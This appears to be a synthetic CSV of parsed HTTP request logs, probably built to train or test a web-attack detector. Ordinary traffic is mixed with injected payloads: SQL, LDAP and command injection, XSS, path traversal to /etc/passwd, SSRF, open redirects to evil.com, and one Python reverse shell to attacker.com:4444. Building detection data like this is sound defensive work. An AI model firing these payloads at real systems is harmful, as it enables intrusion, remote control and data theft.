source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
192.168.1.145,2026-04-07T07:48:25.398924,http://10.0.0.50/directory?user=admin%29%28%21%28%26%281%3D0,http,10.0.0.50,,80,/directory,directory,1,user=admin%29%28%21%28%26%281%3D0,user=admin)(!(&(1=0,1,,,GET,,curl/8.4.0,,pcap
172.16.0.87,2026-04-07T07:48:25.398924,http://192.168.1.100/redir?dest=%2F%2Fevil.com%2Fpath,http,192.168.1.100,,80,/redir,redir,1,dest=%2F%2Fevil.com%2Fpath,dest=//evil.com/path,1,,,GET,,nuclei,,pcap
172.16.0.183,2026-04-07T07:48:25.399899,http://shop.example.com/settings?user=john,http,shop.example.com,,80,/settings,settings,1,user=john,user=john,1,,,HEAD,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.219,2026-04-07T07:48:25.399899,https://webapp.internal/profile?lang=en&from=2024-01-01&status=active,https,webapp.internal,,443,/profile,profile,1,lang=en&from=2024-01-01&status=active,lang=en;from=2024-01-01;status=active,3,,,GET,,curl/8.4.0,,pcap
192.168.1.108,2026-04-07T07:48:25.399899,http://example.com/?q=laptop&lang=en&brand=apple,http,example.com,,80,/,,0,q=laptop&lang=en&brand=apple,q=laptop;lang=en;brand=apple,3,,,GET,,curl/8.4.0,,pcap
10.0.0.8,2026-04-07T07:48:25.400876,https://test-app.local/comment?message=<a,https,test-app.local,,443,/comment,comment,1,message=%3Ca,message=<a,1,,,GET,,curl/8.4.0,,pcap
192.168.1.18,2026-04-07T07:48:25.400876,http://secure.example.com/dashboard?filter=recent&format=json&user=john,http,secure.example.com,,80,/dashboard,dashboard,1,filter=recent&format=json&user=john,filter=recent;format=json;user=john,3,,,GET,,curl/8.4.0,,pcap
192.168.1.93,2026-04-07T07:48:25.400876,http://example.com/about?view=list&status=active&page=1,http,example.com,,80,/about,about,1,view=list&status=active&page=1,view=list;status=active;page=1,3,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.140,2026-04-07T07:48:25.401852,http://test-app.local/privacy,http,test-app.local,,80,/privacy,privacy,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.78,2026-04-07T07:48:25.401852,https://192.168.1.100/news?page=1,https,192.168.1.100,,443,/news,news,1,page=1,page=1,1,,,HEAD,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.70,2026-04-07T07:48:25.401852,https://10.0.0.50/blog,https,10.0.0.50,,443,/blog,blog,1,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.180,2026-04-07T07:48:25.401852,https://192.168.1.100/ldap?filter=admin%29%28%21%28%26%281%3D0,https,192.168.1.100,,443,/ldap,ldap,1,filter=admin%29%28%21%28%26%281%3D0,filter=admin)(!(&(1=0,1,,,GET,,PostmanRuntime/7.35.0,,pcap
192.168.1.31,2026-04-07T07:48:25.402828,http://secure.example.com/admin?username=',http,secure.example.com,,80,/admin,admin,1,username=%27,username=',1,,,POST,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.210,2026-04-07T07:48:25.402828,https://api.example.com/checkout?sort=asc&q=laptop,https,api.example.com,,443,/checkout,checkout,1,sort=asc&q=laptop,sort=asc;q=laptop,2,,,GET,,PostmanRuntime/7.35.0,,pcap
172.16.0.187,2026-04-07T07:48:25.402828,http://example.com/logout,http,example.com,,80,/logout,logout,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.7,2026-04-07T07:48:25.403805,http://admin.example.com/api/v2/data,http,admin.example.com,,80,/api/v2/data,api;v2;data,3,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.142,2026-04-07T07:48:25.403805,http://example.com/faq?id=123,http,example.com,,80,/faq,faq,1,id=123,id=123,1,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.93,2026-04-07T07:48:25.403805,https://10.0.0.50/link?target=%2F%2Fevil.com,https,10.0.0.50,,443,/link,link,1,target=%2F%2Fevil.com,target=//evil.com,1,,,GET,,sqlmap/1.7.12#dev,,pcap
10.0.0.69,2026-04-07T07:48:25.404782,http://shop.example.com/dashboard?lang=en,http,shop.example.com,,80,/dashboard,dashboard,1,lang=en,lang=en,1,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.212,2026-04-07T07:48:25.404782,https://secure.example.com/api/users?order=admin'--,https,secure.example.com,,443,/api/users,api;users,2,order=admin%27--,order=admin'--,1,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.186,2026-04-07T07:48:25.404782,https://api.example.com/checkout?status=active&type=product,https,api.example.com,,443,/checkout,checkout,1,status=active&type=product,status=active;type=product,2,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.225,2026-04-07T07:48:25.404782,https://secure.example.com/api/users?limit=10&lang=en&order=name,https,secure.example.com,,443,/api/users,api;users,2,limit=10&lang=en&order=name,limit=10;lang=en;order=name,3,,,GET,,curl/8.4.0,,pcap
10.0.0.10,2026-04-07T07:48:25.404782,https://example.com/download/../../../var/log/auth.log,https,example.com,,443,/var/log/auth.log,var;log;auth.log,3,,,0,,log,GET,,PostmanRuntime/7.35.0,,pcap
192.168.1.21,2026-04-07T07:48:25.406287,https://example.com/faq,https,example.com,,443,/faq,faq,1,,,0,,,HEAD,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.47,2026-04-07T07:48:25.406829,https://192.168.1.100/api/v2/data,https,192.168.1.100,,443,/api/v2/data,api;v2;data,3,,,0,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.137,2026-04-07T07:48:25.406829,https://api.example.com/api/v2/data,https,api.example.com,,443,/api/v2/data,api;v2;data,3,,,0,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.245,2026-04-07T07:48:25.407810,https://test-app.local/dashboard?q=laptop,https,test-app.local,,443,/dashboard,dashboard,1,q=laptop,q=laptop,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.48,2026-04-07T07:48:25.407810,https://api.example.com/blog/post/1?sort=asc&lang=en&id=123,https,api.example.com,,443,/blog/post/1,blog;post;1,3,sort=asc&lang=en&id=123,sort=asc;lang=en;id=123,3,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.86,2026-04-07T07:48:25.407810,https://10.0.0.50/api/v1/status?sort=asc&brand=apple&page=1,https,10.0.0.50,,443,/api/v1/status,api;v1;status,3,sort=asc&brand=apple&page=1,sort=asc;brand=apple;page=1,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.112,2026-04-07T07:48:25.408789,http://webapp.internal/events,http,webapp.internal,,80,/events,events,1,,,0,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.142,2026-04-07T07:48:25.408789,http://webapp.internal/check?url=http%3A%2F%2Fcustomer1.app.localhost%2F,http,webapp.internal,,80,/check,check,1,url=http%3A%2F%2Fcustomer1.app.localhost%2F,url=http://customer1.app.localhost/,1,,,GET,,burpsuite,,pcap
10.0.0.194,2026-04-07T07:48:25.408789,https://example.com/fetch?url=http%3A%2F%2F192.168.1.1%2F,https,example.com,,443,/fetch,fetch,1,url=http%3A%2F%2F192.168.1.1%2F,url=http://192.168.1.1/,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.98,2026-04-07T07:48:25.409766,http://secure.example.com/exec?target=test&,http,secure.example.com,,80,/exec,exec,1,target=test,target=test,1,,,GET,,curl/8.4.0,,pcap
172.16.0.143,2026-04-07T07:48:25.409766,https://192.168.1.100/search?id=admin%27--,https,192.168.1.100,,443,/search,search,1,id=admin%27--,id=admin'--,1,,,POST,,wfuzz/3.1.0,,pcap
172.16.0.213,2026-04-07T07:48:25.409766,https://example.com/search?query=admin%29%28%21%28%26%281%3D0,https,example.com,,443,/search,search,1,query=admin%29%28%21%28%26%281%3D0,query=admin)(!(&(1=0,1,,,GET,,curl/8.4.0,,pcap
10.0.0.222,2026-04-07T07:48:25.410740,http://192.168.1.100/api/orders?id=123&view=list&page=1,http,192.168.1.100,,80,/api/orders,api;orders,2,id=123&view=list&page=1,id=123;view=list;page=1,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.169,2026-04-07T07:48:25.410740,http://secure.example.com/image?fetch=http%3A%2F%2Fcustomer1.app.localhost%2F,http,secure.example.com,,80,/image,image,1,fetch=http%3A%2F%2Fcustomer1.app.localhost%2F,fetch=http://customer1.app.localhost/,1,,,GET,,Nmap Scripting Engine,,pcap
192.168.1.99,2026-04-07T07:48:25.410740,http://webapp.internal/login?search=%27%20OR%20%271%27%3D%271%27%20--,http,webapp.internal,,80,/login,login,1,search=%27%20OR%20%271%27%3D%271%27%20--,search=' OR '1'='1' --,1,,,POST,,ZAP/2.14.0,,pcap
10.0.0.151,2026-04-07T07:48:25.410740,http://api.example.com/link?target=%2F%2F%2F%2Fevil.com,http,api.example.com,,80,/link,link,1,target=%2F%2F%2F%2Fevil.com,target=////evil.com,1,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.204,2026-04-07T07:48:25.411767,http://webapp.internal/?status=active&page=1,http,webapp.internal,,80,/,,0,status=active&page=1,status=active;page=1,2,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.247,2026-04-07T07:48:25.411767,https://192.168.1.100/download/../../../proc/self/environ,https,192.168.1.100,,443,/proc/self/environ,proc;self;environ,3,,,0,,,GET,,sqlmap/1.7.12#dev,,pcap
192.168.1.36,2026-04-07T07:48:25.411767,http://test-app.local/notifications?page=1&view=list,http,test-app.local,,80,/notifications,notifications,1,page=1&view=list,page=1;view=list,2,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.120,2026-04-07T07:48:25.412790,https://10.0.0.50/events?brand=apple,https,10.0.0.50,,443,/events,events,1,brand=apple,brand=apple,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.69,2026-04-07T07:48:25.412790,https://webapp.internal/api/execute?exec=test$(sleep,https,webapp.internal,,443,/api/execute,api;execute,2,exec=test%24%28sleep,exec=test$(sleep,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.138,2026-04-07T07:48:25.412790,http://webapp.internal/logout,http,webapp.internal,,80,/logout,logout,1,,,0,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.123,2026-04-07T07:48:25.413767,http://webapp.internal/api/v1/status,http,webapp.internal,,80,/api/v1/status,api;v1;status,3,,,0,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.223,2026-04-07T07:48:25.413767,http://192.168.1.100/settings,http,192.168.1.100,,80,/settings,settings,1,,,0,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.72,2026-04-07T07:48:25.413767,http://10.0.0.50/terms?sort=asc&view=list,http,10.0.0.50,,80,/terms,terms,1,sort=asc&view=list,sort=asc;view=list,2,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.161,2026-04-07T07:48:25.414741,http://api.example.com/search,http,api.example.com,,80,/search,search,1,,,0,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.193,2026-04-07T07:48:25.414741,https://webapp.internal/feedback?comment=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,https,webapp.internal,,443,/feedback,feedback,1,comment=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,comment=<img src=x onerror=alert('XSS')>,1,,,POST,,curl/8.4.0,,pcap
172.16.0.246,2026-04-07T07:48:25.414741,https://test-app.local/register,https,test-app.local,,443,/register,register,1,,,0,,,GET,,curl/8.4.0,,pcap
192.168.1.205,2026-04-07T07:48:25.414741,http://10.0.0.50/exec?cmd=test%7C%20rev%20%2Fetc%2Fpasswd,http,10.0.0.50,,80,/exec,exec,1,cmd=test%7C%20rev%20%2Fetc%2Fpasswd,cmd=test| rev /etc/passwd,1,,,GET,,dirbuster,,pcap
10.0.0.124,2026-04-07T07:48:25.415715,https://secure.example.com/login?order=',https,secure.example.com,,443,/login,login,1,order=%27,order=',1,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.177,2026-04-07T07:48:25.415715,http://example.com/link?redirect=%2F%2F%2F%2Fevil.com,http,example.com,,80,/link,link,1,redirect=%2F%2F%2F%2Fevil.com,redirect=////evil.com,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.230,2026-04-07T07:48:25.415715,https://admin.example.com/admin?q=',https,admin.example.com,,443,/admin,admin,1,q=%27,q=',1,,,GET,,curl/8.4.0,,pcap
192.168.1.238,2026-04-07T07:48:25.416720,http://api.example.com/api/users?user=john&id=123,http,api.example.com,,80,/api/users,api;users,2,user=john&id=123,user=john;id=123,2,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.204,2026-04-07T07:48:25.416720,http://shop.example.com/news?filter=recent&to=2024-12-31,http,shop.example.com,,80,/news,news,1,filter=recent&to=2024-12-31,filter=recent;to=2024-12-31,2,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.1,2026-04-07T07:48:25.416720,https://test-app.local/profile,https,test-app.local,,443,/profile,profile,1,,,0,,,POST,,python-requests/2.31.0,,pcap
192.168.1.245,2026-04-07T07:48:25.417707,http://secure.example.com/login,http,secure.example.com,,80,/login,login,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.127,2026-04-07T07:48:25.417707,http://test-app.local/file?template=....//....//....//etc/passwd,http,test-app.local,,80,/file,file,1,template=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,template=....//....//....//etc/passwd,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.135,2026-04-07T07:48:25.418679,http://10.0.0.50/dashboard?format=json&page=1&filter=recent,http,10.0.0.50,,80,/dashboard,dashboard,1,format=json&page=1&filter=recent,format=json;page=1;filter=recent,3,,,HEAD,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.191,2026-04-07T07:48:25.418679,http://shop.example.com/admin/run?ip=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,http,shop.example.com,,80,/admin/run,admin;run,2,ip=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,"ip=test; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1,,,POST,,dirbuster,,pcap
192.168.1.253,2026-04-07T07:48:25.418679,https://192.168.1.100/exec?exec=test%26%20whoami,https,192.168.1.100,,443,/exec,exec,1,exec=test%26%20whoami,exec=test& whoami,1,,,POST,,nikto/2.5.0,,pcap
172.16.0.142,2026-04-07T07:48:25.419659,http://secure.example.com/blog/post/1,http,secure.example.com,,80,/blog/post/1,blog;post;1,3,,,0,,,HEAD,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.2,2026-04-07T07:48:25.419659,http://test-app.local/products,http,test-app.local,,80,/products,products,1,,,0,,,GET,,python-requests/2.31.0,,pcap
192.168.1.251,2026-04-07T07:48:25.419659,https://test-app.local/read?include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,https,test-app.local,,443,/read,read,1,include=..%2F..%2F..%2Fetc%2Fpasswd,include=../../../etc/passwd,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.21,2026-04-07T07:48:25.419659,http://secure.example.com/js/main.js,http,secure.example.com,,80,/js/main.js,js;main.js,2,,,0,,js,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.2,2026-04-07T07:48:25.420636,http://webapp.internal/products?q=1;,http,webapp.internal,,80,/products,products,1,q=1%3B,q=1;,1,,,GET,,nikto/2.5.0,,pcap
172.16.0.137,2026-04-07T07:48:25.420636,https://webapp.internal/checkout,https,webapp.internal,,443,/checkout,checkout,1,,,0,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.239,2026-04-07T07:48:25.421609,https://192.168.1.100/blog/post/1?q=laptop,https,192.168.1.100,,443,/blog/post/1,blog;post;1,3,q=laptop,q=laptop,1,,,GET,,python-requests/2.31.0,,pcap
10.0.0.188,2026-04-07T07:48:25.421609,https://10.0.0.50/api/v1/status?lang=en&q=laptop,https,10.0.0.50,,443,/api/v1/status,api;v1;status,3,lang=en&q=laptop,lang=en;q=laptop,2,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.75,2026-04-07T07:48:25.421609,https://api.example.com/login?view=list&brand=apple&category=electronics,https,api.example.com,,443,/login,login,1,view=list&brand=apple&category=electronics,view=list;brand=apple;category=electronics,3,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.190,2026-04-07T07:48:25.422585,http://test-app.local/ldap?query=%2A%29%28objectClass%3D%2A,http,test-app.local,,80,/ldap,ldap,1,query=%2A%29%28objectClass%3D%2A,query=*)(objectClass=*,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.8,2026-04-07T07:48:25.422585,https://test-app.local/terms,https,test-app.local,,443,/terms,terms,1,,,0,,,GET,,python-requests/2.31.0,,pcap
10.0.0.57,2026-04-07T07:48:25.422585,http://10.0.0.50/comment?comment=<body,http,10.0.0.50,,80,/comment,comment,1,comment=%3Cbody,comment=<body,1,,,GET,,wfuzz/3.1.0,,pcap
172.16.0.153,2026-04-07T07:48:25.423779,http://shop.example.com/admin/run?host=test|,http,shop.example.com,,80,/admin/run,admin;run,2,host=test%7C,host=test|,1,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.214,2026-04-07T07:48:25.423779,http://secure.example.com/dashboard,http,secure.example.com,,80,/dashboard,dashboard,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.34,2026-04-07T07:48:25.423779,http://10.0.0.50/api/users?id=1',http,10.0.0.50,,80,/api/users,api;users,2,id=1%27,id=1',1,,,GET,,burpsuite,,pcap
172.16.0.1,2026-04-07T07:48:25.424777,http://example.com/?limit=10&format=json,http,example.com,,80,/,,0,limit=10&format=json,limit=10;format=json,2,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.199,2026-04-07T07:48:25.424777,http://secure.example.com/index.html?lang=en,http,secure.example.com,,80,/index.html,index.html,1,lang=en,lang=en,1,,html,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.146,2026-04-07T07:48:25.424777,http://test-app.local/link?redirect=%2F%2Fevil.com%2Fpath,http,test-app.local,,80,/link,link,1,redirect=%2F%2Fevil.com%2Fpath,redirect=//evil.com/path,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.156,2026-04-07T07:48:25.424777,http://secure.example.com/privacy?id=123,http,secure.example.com,,80,/privacy,privacy,1,id=123,id=123,1,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.90,2026-04-07T07:48:25.425750,http://example.com/proxy?path=http%3A%2F%2F2130706433%2F,http,example.com,,80,/proxy,proxy,1,path=http%3A%2F%2F2130706433%2F,path=http://2130706433/,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.105,2026-04-07T07:48:25.425750,https://shop.example.com/redir?url=https%3A%2F%2Fevil.com%40legitimate.com,https,shop.example.com,,443,/redir,redir,1,url=https%3A%2F%2Fevil.com%40legitimate.com,url=https://evil.com@legitimate.com,1,,,GET,,gobuster/3.6,,pcap
10.0.0.162,2026-04-07T07:48:25.425750,http://admin.example.com/api/products?page=1,http,admin.example.com,,80,/api/products,api;products,2,page=1,page=1,1,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.240,2026-04-07T07:48:25.426754,http://webapp.internal/products,http,webapp.internal,,80,/products,products,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.232,2026-04-07T07:48:25.427309,http://admin.example.com/register?filter=recent&type=product,http,admin.example.com,,80,/register,register,1,filter=recent&type=product,filter=recent;type=product,2,,,POST,,python-requests/2.31.0,,pcap
192.168.1.241,2026-04-07T07:48:25.427309,http://api.example.com/news?brand=apple&order=name,http,api.example.com,,80,/news,news,1,brand=apple&order=name,brand=apple;order=name,2,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.144,2026-04-07T07:48:25.428300,https://webapp.internal/help?order=name,https,webapp.internal,,443,/help,help,1,order=name,order=name,1,,,GET,,curl/8.4.0,,pcap
10.0.0.30,2026-04-07T07:48:25.428300,http://192.168.1.100/blog/post/1,http,192.168.1.100,,80,/blog/post/1,blog;post;1,3,,,0,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.215,2026-04-07T07:48:25.428300,https://admin.example.com/profile?brand=apple,https,admin.example.com,,443,/profile,profile,1,brand=apple,brand=apple,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.142,2026-04-07T07:48:25.429495,http://10.0.0.50/api/products?q=laptop&brand=apple&format=json,http,10.0.0.50,,80,/api/products,api;products,2,q=laptop&brand=apple&format=json,q=laptop;brand=apple;format=json,3,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
